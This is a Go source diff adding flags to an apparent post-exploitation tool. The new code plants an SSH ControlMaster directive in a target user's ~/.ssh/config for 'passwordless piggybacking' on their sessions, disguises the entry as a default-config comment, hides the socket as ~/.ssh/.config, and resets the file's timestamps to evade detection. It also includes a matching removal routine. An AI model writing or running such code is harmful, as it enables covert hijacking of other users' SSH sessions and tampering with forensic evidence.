@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	osuser "os/user"
 	"path/filepath"
 	"regexp"
 	"strings"
@@ -36,7 +37,9 @@ var (
 	flag_poll_users = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
 
 	// Non-recon
-	flag_stalk = flag.String("stalk", "", "Wait until a user logs in and then do something. Use \"*\" to match any user.")
+	flag_stalk     = flag.String("stalk", "", "Wait until a user logs in and then do something. Use \"*\" to match any user.")
+	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
+	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Remove user's ControlMaster directive.")
 )
 
 var (
@@ -318,6 +321,115 @@ func getWatches() ([]watch, error) {
 	return found, nil
 }
 
+func getSSHConfigFilename(user string) (string, error) {
+	u, err := osuser.Lookup(user)
+	if err != nil {
+		return "", err
+	}
+	return fmt.Sprintf("%s/.ssh/config", u.HomeDir), nil
+}
+
+func setSSHControlMaster(user string) error {
+	var origTime = time.Time{}
+	filename, err := getSSHConfigFilename(user)
+	if s, err := os.Stat(filename); err == nil {
+		origTime = s.ModTime()
+	}
+	if err != nil {
+		return err
+	}
+	// Either create the config file or append to it
+	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+
+	directive := `Host *  # Default config. Do not edit below this line.
+        ControlPath ~/.ssh/.config
+        ControlMaster auto
+        ControlPersist 10m`
+	f.WriteString(directive + "\n")
+
+	// Replace the original access and modification times.
+	if err := os.Chtimes(filename, origTime, origTime); err != nil {
+		fmt.Println("Couldn't reset atime/mtime on ssh config file.")
+	}
+	return nil
+}
+
+func unsetSSHControlMaster(user string) error {
+	var origTime = time.Time{}
+	filename, err := getSSHConfigFilename(user)
+	if err != nil {
+		return err
+	}
+	if s, err := os.Stat(filename); err == nil {
+		origTime = s.ModTime()
+	}
+
+	// Snarf in the whole file and search lines for our distinct "Host *" line.
+	body, err := ioutil.ReadFile(filename)
+	if err != nil {
+		// Somehow the config was removed. Panic.
+		return err
+	}
+	// Janky means of munging the config file back to its original state
+	newFile := ""
+	toSkip := 4
+	haveSkipped := 0
+	for _, line := range strings.Split(string(body), "\n") {
+		if line == "Host *  # Default config. Do not edit below this line." {
+			haveSkipped += 1
+		}
+		// We'll skip a maximum of three lines
+		if haveSkipped > 0 && haveSkipped <= toSkip {
+			haveSkipped += 1
+		} else {
+			newFile += line + "\n"
+		}
+	}
+	// We didn't find our Control Master. In this case, we either hadn't yet set Control Master
+	// or it has since been removed. Either way, don't modify the config file. Just bail.
+	if haveSkipped == 0 {
+		return nil
+	}
+	// This hack removes potentially multiple trailing newlines and replaces it with just a single newline.
+	// This doesn't leave things *exactly* as they were prior to injecting the Control Master.
+	// (In cases where removing the ControlMaster directive would result in multiple legit newlines. This
+	// is improbable.)
+	newFile = strings.TrimRight(newFile, "\n")
+	newFile += "\n"
+
+	// Create temp file, write the new contents, then replace user's config file with this new one.
+	tmp, err := ioutil.TempFile(filepath.Dir(filename), "tmp")
+	defer tmp.Close()
+	if err != nil {
+		fmt.Println("Can't unset SSH Control Master")
+		return err
+	}
+
+	// Create the new config without the Control Master directive.
+	if _, err := tmp.WriteString(newFile); err != nil {
+		fmt.Println("Unable to create new config in temp file")
+		return err
+	}
+
+	// Move the new config into place.
+	if err := os.Rename(tmp.Name(), filename); err != nil {
+		fmt.Println("Error placing new config", err)
+		return err
+	}
+
+	// Replace the original access and modification times.
+	if err := os.Chtimes(filename, origTime, origTime); err != nil {
+		// Even if we can't update the times, don't return an error since the primary
+		// objective of this function is successful.
+		fmt.Println("Couldn't reset atime/mtime on ssh config file")
+	}
+	return nil
+}
+
 // stalkUser perform an action when a specific user logs in at any point in the future.
 // If user == "*", any user will trigger the action.
 func stalkUser(user string, sa stalkAction) error {
@@ -421,5 +533,11 @@ func main() {
 	}
 	if *flag_stalk != "" {
 		stalkUser(*flag_stalk, func(user string) error { fmt.Printf("User logged in! %s", user); return nil })
+	}
+	if *flag_ssh_cm != "" {
+		setSSHControlMaster(*flag_ssh_cm)
+	}
+	if *flag_rm_ssh_cm != "" {
+		unsetSSHControlMaster(*flag_rm_ssh_cm)
 	}
 }
